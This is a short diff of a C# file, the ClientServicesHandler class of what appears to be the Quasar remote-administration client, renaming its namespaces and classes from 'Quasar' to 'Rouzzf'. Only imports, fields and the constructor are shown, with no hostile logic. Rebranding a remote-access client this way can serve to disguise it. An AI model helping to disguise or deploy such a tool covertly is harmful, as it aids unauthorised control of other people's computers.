@@ -1,24 +1,24 @@
-﻿using Quasar.Client.Config;
-using Quasar.Client.Networking;
-using Quasar.Client.Setup;
-using Quasar.Client.User;
-using Quasar.Client.Utilities;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Config;
+using Rouzzf.Client.Networking;
+using Rouzzf.Client.Setup;
+using Rouzzf.Client.User;
+using Rouzzf.Client.Utilities;
+using Rouzzf.Common.Enums;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 using System.Diagnostics;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class ClientServicesHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
+        private readonly RouzzfClient _client;
 
-        private readonly QuasarApplication _application;
+        private readonly RouzzfApplication _application;
 
-        public ClientServicesHandler(QuasarApplication application, QuasarClient client)
+        public ClientServicesHandler(RouzzfApplication application, RouzzfClient client)
         {
             _application = application;
             _client = client;
